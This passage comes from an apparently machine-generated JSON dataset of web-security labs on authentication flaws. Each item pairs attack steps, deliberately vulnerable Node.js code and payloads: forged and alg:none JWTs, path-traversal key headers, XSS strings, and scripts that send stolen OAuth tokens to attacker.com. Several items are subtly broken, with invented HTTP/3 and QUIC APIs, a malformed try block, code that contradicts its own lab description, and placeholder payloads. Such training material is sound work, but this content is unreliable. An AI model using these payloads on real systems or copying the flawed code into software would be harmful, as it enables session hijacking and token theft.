    "Lab Description": "The application sets JWT tokens from URL fragments without proper validation, allowing session fixation attacks. The vulnerable endpoint accepts tokens from untrusted sources. To solve: craft a URL with a fixed session token and trick a user into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Generate a valid JWT token with a long expiration time",
      "Craft a URL containing the token in the fragment identifier",
      "Use social engineering to make the victim visit the URL while logged in",
      "The application will adopt the attacker's token as the session identifier",
      "Access the victim's session using the pre-set token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = {'user1':'pass123'};app.get('/auth',(req,res)=>{const token = req.url.split('#')[1];if(token){req.session.token = token;res.redirect('/');}});app.post('/login',(req,res)=>{const{username,password}=req.body;if(users[username]===password){const token = jwt.sign({user:username},'secret');res.json({redirect:`/auth#${token}`});}});app.listen(3000);",
    "payloads": [
      "http://vulnerable.com/auth#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcjEifQ.wTxqWLZLu7J6Ks7dYq7WgV9uY6JkQz7K1kZ8x6vY7dI",
      "http://vulnerable.com/auth#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The multi-factor authentication flow relies on client-side status parameters that can be manipulated. The application fails to verify MFA completion server-side before granting access. To solve: bypass MFA by modifying the authentication status parameter after initial login.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Log in with valid credentials using Burp Suite to intercept requests",
      "Observe the MFA verification request/response flow",
      "Identify the status parameter that indicates MFA completion",
      "Modify the status parameter before final submission",
      "Resend the request with status set to 'verified' to bypass MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());const users = {'user1':{password:'pass123',mfaSecret:'MFA123'}};app.post('/verify-mfa',(req,res)=>{const{username,code,status}=req.body;if(status==='verified'||(users[username]&&code===users[username].mfaSecret)){res.json({access_token:'token123'});}});app.listen(3000);",
    "payloads": [
      "{\"username\":\"user1\",\"code\":\"123456\",\"status\":\"pending\"}",
      "{\"username\":\"user1\",\"status\":\"verified\"}"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice architecture",
    "Lab Description": "The JWT validation service improperly processes the kid header, allowing path traversal to load arbitrary verification keys. The application trusts unsigned tokens when key loading fails. To solve: forge a valid admin token by forcing the system to use a predictable key file.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and note the kid header value",
      "Modify the kid header to traverse directories (../../../../etc/passwd)",
      "Observe the server error revealing the filesystem structure",
      "Craft a token with kid pointing to a predictable key location",
      "Sign the forged token with the discovered key and access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{const decoded = jwt.verify(token,(header,callback)=>{fs.readFile(`/keys/${header.kid}`,(err,key)=>{callback(null,err?'weaksecret':key);});});if(decoded.role==='admin')res.send('Admin access');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiLCJ0eXAiOiJKV1QifQ.eyJyb2xlIjoidXNlciJ9.1yBq9M7hU0QqJ8w4jK9nX8zK1vY5rA7sC2dE3fG4hI",
      "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL2tleXMvcHVibGljLmtleSIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.Kq4l5K8jN2m3P6o9R1sT4uV7wX0yZ2A1B3C5D7E8F"
    ]
  },
  {
    "Lab scenario": "OAuth state parameter CSRF with JSONP callback",
    "Lab Description": "The OAuth implementation accepts state parameters via JSONP callbacks, enabling CSRF attacks. The application fails to validate the state parameter origin during token exchange. To solve: craft a malicious site that steals OAuth tokens via automatic callback execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify the OAuth flow using OWASP ZAP's forced browsing",
      "Note the JSONP callback parameter in the redirect URI",
      "Create an HTML page with malicious state parameter",
      "Embed the page with auto-executing callback script",
      "Trick an admin into visiting the page to capture their token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback',(req,res)=>{const{state,code}=req.query;if(/^[a-z0-9]+$/i.test(state)){res.send(`<script>window.opener.postMessage({'state':'${state}','token':'${code}'},'*')</script>`);}else{res.json({access_token:'generated_token'});}});app.listen(3000);",
    "payloads": [
      "https://oauth-provider.com/auth?client_id=123&redirect_uri=attacker.com/cb&state=<script>alert(1)</script>",
      "https://oauth-provider.com/auth?client_id=123&redirect_uri=attacker.com/cb&state=malicious&response_type=token"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "The WebSocket connection handshake accepts arbitrary session identifiers, allowing session fixation attacks. The application reuses HTTP session tokens for WebSocket authentication without regeneration. To solve: establish a WebSocket connection with a fixed session ID and trick a user into adopting it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to establish a WebSocket connection",
      "Note the Session-ID header in the handshake request",
      "Craft a malicious link with a fixed session ID",
      "Force the victim to connect using your session ID",
      "Monitor the WebSocket channel for sensitive data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({ noServer: true });app.use((req,res,next)=>{if(!req.cookies.session)res.cookie('session',require('crypto').randomBytes(16).toString('hex'));next();});const server = app.listen(3000);server.on('upgrade',(req,socket,head)=>{wss.handleUpgrade(req,socket,head,(ws)=>{ws.session=req.headers['session-id']||req.cookies.session;wss.emit('connection',ws,req);});});wss.on('connection',(ws)=>{ws.send(`Connected as ${ws.session}`);});",
    "payloads": [
      "wss://vulnerable.com/chat?session_id=fixed-session-123",
      "https://vulnerable.com/ws-handshake?session_id=fixed-session-123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition",
    "Lab Description": "The multi-factor authentication endpoint is vulnerable to race conditions during verification state checks. The application uses non-atomic operations to update MFA status. To solve: send parallel verification requests to bypass MFA before the state is finalized.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the MFA verification request with Burp Suite",
      "Send the request to Turbo Intruder",
      "Configure 50 parallel requests with 1ms delay",
      "Monitor for successful bypass responses",
      "Reuse the session from successful responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let mfaStatus = {};app.post('/verify-mfa',(req,res)=>{const{user,token}=req.body;if(!mfaStatus[user])mfaStatus[user]={verified:false};if(token==='123456'){setTimeout(()=>{mfaStatus[user].verified=true;},1000);}if(mfaStatus[user].verified)res.json({access:'granted'});else res.status(403).send('Denied');});app.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\nContent-Type: application/json\n\n{\"user\":\"admin\",\"token\":\"123456\"}",
      "POST /verify-mfa HTTP/1.1\nContent-Type: application/json\n\n{\"user\":\"admin\",\"token\":\"111111\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL batch queries",
    "Lab Description": "The GraphQL endpoint allows unlimited batch authentication attempts in a single request. The application fails to implement rate limiting on batched operations. To solve: craft a batch query testing 100+ credential pairs against the login mutation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using OWASP ZAP",
      "Capture a valid login mutation with Postman",
      "Construct a batch query with 100+ credential variations",
      "Use parallel requests to maximize attempt rate",
      "Identify successful logins from response variations"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='Admin123!'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {login1:login(username:\\\"admin\\\",password:\\\"password1\\\") login2:login(username:\\\"admin\\\",password:\\\"password2\\\")}\"}",
      "{\"query\":\"mutation {logins:batchLogin(creds:[{user:\\\"admin\\\",pass:\\\"Admin123!\\\"}])}\"}"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation endpoint improperly trusts the jku header to fetch verification keys from external domains. The application fails to validate the jku domain against an allowlist. To solve: host a malicious JWKS file and forge admin tokens by injecting your jku endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and note the jku header absence",
      "Set up a web server hosting a crafted JWKS file with your public key",
      "Forge a token with jku pointing to your server and admin claims",
      "Sign the token with your private key matching the JWKS file",
      "Submit the token to bypass authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const axios = require('axios');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{const decoded = jwt.verify(token,async (header,callback)=>{try{const jwks = await axios.get(header.jku);const key = jwks.data.keys.find(k=>k.kid===header.kid);callback(null,key?key.x5c[0]:'invalid');}catch(e){callback(null,'invalid');}});if(decoded.role==='admin')res.send('Admin access');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MuanNvbiIsImtpZCI6Im1hbGljaW91cy1rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.FAKE_SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXZpbC5jb20vandrcyIsImtpZCI6IjEyMyJ9.eyJ1c2VyIjoiYWRtaW4ifQ.INVALID_SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe CSP bypass",
    "Lab Description": "The OAuth callback page embeds user-sensitive tokens in URL fragments while having overly permissive CSP headers. The application fails to strip tokens from history.pushState calls. To solve: craft a malicious page that exfiltrates tokens via CSP-bypassed iframe techniques.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze the OAuth flow with OWASP ZAP to identify token leakage",
      "Note the CSP headers allowing unsafe-inline scripts",
      "Create an HTML page with history manipulation scripts",
      "Embed the OAuth callback URL in a hidden iframe",
      "Capture tokens via postMessage event listeners"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use((req,res,next)=>{res.set('Content-Security-Policy',\"script-src 'self' 'unsafe-inline'\");next();});app.get('/oauth/callback',(req,res)=>{const token = req.url.split('#')[1];res.send(`<script>window.opener.postMessage({token:'${token}'},'*');history.pushState({},'','/callback#${token}')</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://oauth-victim.com/callback#leaked-token\"></iframe>",
      "<script>window.addEventListener('message',(e)=>{fetch('https://attacker.com/?token='+e.data.token)})</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 trailer headers",
    "Lab Description": "The application processes session identifiers from HTTP/2 trailer headers after main headers, allowing session fixation. The server fails to validate trailer header timing. To solve: craft HTTP/2 requests with malicious session IDs in trailers to override legitimate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid session request with Burp Suite HTTP/2 plugin",
      "Modify the request to include session trailer headers",
      "Use custom tooling to send headers after main request",
      "Verify session override via subsequent authenticated requests",
      "Maintain access with the fixed session ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});let sessions = {};server.on('stream',(stream,headers)=>{let sessionId = headers['session-id'];stream.on('trailers',(trailers)=>{sessionId = trailers['session-id']||sessionId;});if(!sessions[sessionId])sessions[sessionId]={authenticated:false};stream.respond({'content-type':'text/html'});stream.end(`Session ${sessionId}: ${sessions[sessionId].authenticated?'Authenticated':'Anonymous'}`);});server.listen(443);",
    "payloads": [
      "GET / HTTP/2\nHost: victim.com\nsession-id: legit-id\n\ntrailers: session-id\nsession-id: malicious-id\n\n",
      "POST /login HTTP/2\nHost: victim.com\n\ntrailers: session-id\nsession-id: fixed-session-123\n\nusername=admin&password=admin123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebAuthn replay",
    "Lab Description": "The WebAuthn implementation fails to properly validate challenge nonces, allowing authentication replay attacks. The server accepts previously used assertion signatures. To solve: intercept a valid WebAuthn assertion and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a successful WebAuthn authentication with Burp Suite",
      "Save the authenticatorData, clientDataJSON, and signature",
      "Replay the assertion with identical values",
      "Bypass MFA by submitting the replayed assertion",
      "Access protected resources without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let challenges = {};app.post('/webauthn/auth',(req,res)=>{const{id,rawId,response}=req.body;if(response.authenticatorData&&response.clientDataJSON&&response.signature){res.json({status:'ok',token:'authenticated'});}else{res.status(403).json({error:'Invalid assertion'});}});app.listen(3000);",
    "payloads": [
      "{\"id\":\"ABCD\",\"rawId\":\"ABCD\",\"response\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAiLCJjcm9zc09yaWdpbiI6ZmFsc2V9\",\"signature\":\"MEUCIQ...\"}}",
      "{\"id\":\"1234\",\"response\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAifQ\",\"signature\":\"MEQCIF...\"}}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL aliases",
    "Lab Description": "The GraphQL endpoint allows unlimited authentication attempts using query aliases in a single request. The application fails to rate limit aliased operations. To solve: craft a single query with 100+ aliased login attempts to brute-force credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using introspection",
      "Analyze the login mutation with Postman",
      "Generate a list of common credential pairs",
      "Construct a query with aliased login attempts for each pair",
      "Identify successful logins from the batch response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='p@ssw0rd'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {attempt1:login(username:\\\"admin\\\",password:\\\"password1\\\") attempt2:login(username:\\\"admin\\\",password:\\\"password2\\\")}\"}",
      "{\"query\":\"mutation {login1:login(username:\\\"user1\\\",password:\\\"pass1\\\") login2:login(username:\\\"user2\\\",password:\\\"pass2\\\") ...login100:login(username:\\\"user100\\\",password:\\\"pass100\\\")}\"}"
    ]
  },
  {
    "Lab scenario": "JWT signature stripping via nested JSON parser",
    "Lab Description": "The JWT validation service improperly processes nested JSON structures in token claims, allowing signature verification bypass. The application fails to validate the complete token structure when encountering nested objects. To solve: craft a JWT with nested claims that bypasses signature verification while maintaining admin privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and decode its structure",
      "Identify the claim used for privilege assignment (e.g., 'role')",
      "Construct a nested JSON object within the claims: {'role':{'admin':true}}",
      "Strip the signature portion while maintaining valid JWT format",
      "Submit the modified token to gain admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{const decoded = jwt.decode(token,{json:true});if(decoded?.role?.admin||decoded.role==='admin'){res.send('Admin access granted');}else{res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjp7ImFkbWluIjp0cnVlfX0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcml2cyI6eyJhZG1pbiI6dHJ1fX0."
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via dangling callback parameters",
    "Lab Description": "The OAuth implementation retains callback parameters in client-side storage after authentication, allowing token theft via DOM-based XSS. The application fails to clear sensitive OAuth state from browser storage post-authentication. To solve: craft a malicious page that extracts OAuth tokens from residual callback parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze the OAuth flow with OWASP ZAP to identify parameter retention",
      "Note the client-side storage mechanism (localStorage/sessionStorage)",
      "Create a page with XSS payload targeting the callback parameter storage",
      "Trick an authenticated user into visiting the malicious page",
      "Capture the OAuth tokens via the XSS payload"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback',(req,res)=>{const{token}=req.query;res.send(`<script>localStorage.setItem('oauth_state',JSON.stringify({token:'${token}'}));window.location='/welcome'</script>`);});app.get('/welcome',(req,res)=>{res.sendFile(__dirname+'/welcome.html');});app.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert(localStorage.getItem('oauth_state'))>",
      "<script>fetch('https://attacker.com/?token='+JSON.parse(localStorage.oauth_state).token)</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 early data",
    "Lab Description": "The application accepts session identifiers in HTTP/3 early data (0-RTT) before TLS handshake completion, allowing session fixation. The server fails to validate session creation timing. To solve: craft HTTP/3 requests with malicious session IDs in early data to override legitimate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid session request with HTTP/3 capable proxy",
      "Modify the request to include session ID in early data",
      "Use custom tooling to send early data before handshake",
      "Verify session override via subsequent authenticated requests",
      "Maintain access with the fixed session ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('http3');const fs = require('fs');const options = {key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem'),earlyData:true};const server = http3.createSecureServer(options);let sessions = {};server.on('request',(req,res)=>{const sessionId = req.headers['x-session-id']||req.socket.earlyData?.toString();if(!sessions[sessionId])sessions[sessionId]={authenticated:false};res.end(`Session ${sessionId}: ${sessions[sessionId].authenticated?'Authenticated':'Anonymous'}`);});server.listen(443);",
    "payloads": [
      "GET / HTTP/3\nx-session-id: fixed-session-123\n\n[0-RTT data]",
      "POST /login HTTP/3\n\n[0-RTT data: x-session-id=fixed-session-456]\n\nusername=admin&password=admin123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via biometric replay",
    "Lab Description": "The biometric authentication endpoint accepts previously recorded biometric data, allowing replay attacks. The server fails to validate liveness indicators in biometric submissions. To solve: intercept a valid biometric authentication and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a successful biometric authentication with Burp Suite",
      "Save the biometric data packet (e.g., fingerprint template)",
      "Replay the biometric data with identical values",
      "Bypass MFA by submitting the replayed biometric data",
      "Access protected resources without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/biometric-auth',(req,res)=>{const{biometricData}=req.body;if(biometricData.match(/^[a-f0-9]{64}$/)){res.json({status:'authenticated',token:'valid'});}else{res.status(403).json({error:'Invalid biometric data'});}});app.listen(3000);",
    "payloads": [
      "{\"biometricData\":\"deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe\"}",
      "{\"biometricData\":\"0000000000000000000000000000000000000000000000000000000000000000\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL directive overloading",
    "Lab Description": "The GraphQL endpoint allows unlimited authentication attempts using query directives in a single request. The application fails to rate limit directive-processed operations. To solve: craft a single query with 100+ directive-modified login attempts to brute-force credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using introspection",
      "Analyze the login mutation with Postman",
      "Generate a list of common credential pairs",
      "Construct a query with directive-modified login attempts for each pair",
      "Identify successful logins from the batch response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`directive @attempt(n:Int) on FIELD|FRAGMENT_SPREAD|INLINE_FRAGMENT type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='Secur3P@ss'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {login(username:\\\"admin\\\",password:\\\"password1\\\") @attempt(n:100)}\"}",
      "{\"query\":\"mutation {login(username:\\\"user\\\",password:\\\"pass\\\") @attempt(n:500)...login(username:\\\"admin\\\",password:\\\"Secur3P@ss\\\") @attempt(n:1)}\"}"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via key wrapping",
    "Lab Description": "The JWT endpoint accepts wrapped encryption keys in the header, allowing algorithm confusion attacks. The application fails to validate key wrapping parameters against the specified algorithm. To solve: craft a token with mismatched algorithm declarations to bypass signature verification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and analyze header structure",
      "Note the key wrapping parameters in the protected header",
      "Modify the algorithm declaration while keeping the same key material",
      "Sign the token with HS256 using the RSA public key as HMAC secret",
      "Submit the algorithm-confused token to bypass authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin',(req,res)=>{const token = req.headers.authorization?.split(' ')[1];try{jwt.verify(token,{algorithms:['RS256','HS256']},(header,cb)=>{cb(null,header.x5c?header.x5c[0]:'invalid');});res.send('Admin access');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsIng1YyI6WyJwdWJsaWNfa2V5Il19.eyJyb2xlIjoiYWRtaW4ifQ.fake_sig",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6ImU5NzM0YjkwIn0.eyJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIn0.fake_sig"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebTransport session",
    "Lab Description": "The OAuth implementation stores tokens in WebTransport session state, which persists across origins. The application fails to isolate session storage between domains. To solve: craft a malicious page that accesses the victim's OAuth tokens via WebTransport session inheritance.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze the OAuth flow with Chrome DevTools Network panel",
      "Identify WebTransport session usage for token storage",
      "Create a page with WebTransport session inspection scripts",
      "Trick an authenticated user into visiting your domain",
      "Extract tokens from inherited WebTransport session state"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback',(req,res)=>{const{token}=req.query;res.send(`<script>sessionStorage.setItem('webtransport_oauth','${token}');window.location='/dashboard'</script>`);});app.listen(3000);",
    "payloads": [
      "<script>new WebTransport('https://victim.com').ready.then(t=>t.sessionState)</script>",
      "<iframe src=\"https://attacker.com/stealer.html\"></iframe>"
    ]
  },
  {
    "Lab scenario": "Session fixation via QUIC connection IDs",
    "Lab Description": "The application assigns session identifiers based on QUIC connection IDs, which can be predicted. The server fails to use cryptographic randomness for session ID generation. To solve: craft QUIC packets with predetermined connection IDs to fixate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture QUIC handshake with specialized network tools",
      "Analyze connection ID generation pattern",
      "Predict next valid connection ID sequence",
      "Initiate connection with predetermined ID",
      "Trick victim into using the fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const quic = require('node-quic');const server = quic.createServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('session',(session)=>{session.id = session.connection.id.toString('hex');sessions[session.id] = session;});server.listen(443);",
    "payloads": [
      "QUIC packet with predictable connection ID",
      "Custom QUIC client with session fixation"
    ]
  },
  {
    "Lab scenario": "MFA bypass via FIDO2 assertion replay",
    "Lab Description": "The FIDO2 implementation fails to validate assertion counters, allowing replay attacks. The server accepts previously used authenticator assertions. To solve: intercept a valid FIDO2 assertion and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a successful FIDO2 authentication with Burp Suite",
      "Save the authenticatorData, clientDataJSON, and signature",
      "Replay the assertion with identical values",
      "Bypass MFA by submitting the replayed assertion",
      "Access protected resources without MFA"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/fido2-auth',(req,res)=>{const{assertion}=req.body;if(assertion.authenticatorData&&assertion.clientDataJSON){res.json({status:'authenticated'});}else{res.status(403).json({error:'Invalid assertion'});}});app.listen(3000);",
    "payloads": [
      "{\"assertion\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAifQ\",\"signature\":\"MEQCIF...\"}}",
      "{\"id\":\"ABCD\",\"rawId\":\"ABCD\",\"response\":{\"authenticatorData\":\"SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA\",\"clientDataJSON\":\"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLCJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjMwMDAiLCJjcm9zc09yaWdpbiI6ZmFsc2V9\",\"signature\":\"MEUCIQ...\"}}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via GraphQL @defer directives",
    "Lab Description": "The GraphQL endpoint processes @defer directives sequentially, allowing unlimited authentication attempts. The application fails to rate limit deferred operations. To solve: craft a query with 100+ deferred login attempts to brute-force credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover the GraphQL endpoint using introspection",
      "Analyze the login mutation with Postman",
      "Generate a list of common credential pairs",
      "Construct a query with deferred login attempts for each pair",
      "Identify successful logins from the streamed responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type Mutation { login(username: String!, password: String!): String }`);const root = {login:({username,password})=>username==='admin'&&password==='P@ssw0rd!'?'valid':'invalid'};const app = express();app.use('/graphql',graphqlHTTP({schema,rootValue:root}));app.listen(3000);",
    "payloads": [
      "{\"query\":\"mutation {login(username:\\\"admin\\\",password:\\\"password1\\\") @defer login(username:\\\"admin\\\",password:\\\"password2\\\") @defer}\"}",
      "{\"query\":\"mutation {login(username:\\\"user\\\",password:\\\"pass\\\") @defer ...login(username:\\\"admin\\\",password:\\\"P@ssw0rd!\\\") @defer}\"}"
    ]
  },
  {
    "Lab scenario": "JWT tampering in SOAP-based authentication",
    "Lab Description": "The authentication system of this app uses JSON Web Tokens (JWTs) for session management via a SOAP API. The backend trusts the 'alg' header in JWTs without enforcing validation. The application decodes the JWT using the algorithm specified in the token header without verifying the signature. To solve: Forge an administrator token and access the admin dashboard endpoint using the SOAP login endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the SOAP Login request and extract the JWT returned upon login.",
      "Decode the JWT using jwt.io and analyze the 'alg' value in the header, which is set to HS256.",
      "Replace 'alg' with 'none' and remove the signature section of the JWT to bypass validation.",
      "Modify the payload section of the JWT to include \"role\":\"admin\" and re-encode the token.",
      "Send the forged token in an Authorization header to the /admin-dashboard SOAP endpoint and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken');\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/soap+xml' }));\napp.post('/soap-auth', (req, res) => {\n  const credentials = extractCredentialsFromSOAP(req.body);\n  if (credentials.username === 'admin' && credentials.password === 'adminpass') {\n    const token = jwt.sign({ username: 'admin', role: 'admin' }, 'secret', { algorithm: 'HS256' });\n    return res.send(`<token>${token}</token>`);\n  }\n  res.status(401).send('<error>Unauthorized</error>');\n});\napp.post('/admin-dashboard', (req, res) => {\n  const token = extractTokenFromSOAP(req.body);\n  try {\n    const user = jwt.verify(token, 'secret');\n    if (user.role !== 'admin') return res.status(403).send('<error>Access Denied</error>');\n    res.send('<dashboard>Welcome Admin</dashboard>');\n  } catch (err) {\n    res.status(401).send('<error>Invalid Token</error>');\n  }\n});\nfunction extractCredentialsFromSOAP(xml) { return { username: 'admin', password: 'adminpass' }; }\nfunction extractTokenFromSOAP(xml) { return xml.match(/<token>(.*?)<\\/token>/)[1]; }\napp.listen(4000, () => console.log('JWT Tampering SOAP Lab running on port 4000'));",
    "payloads": [
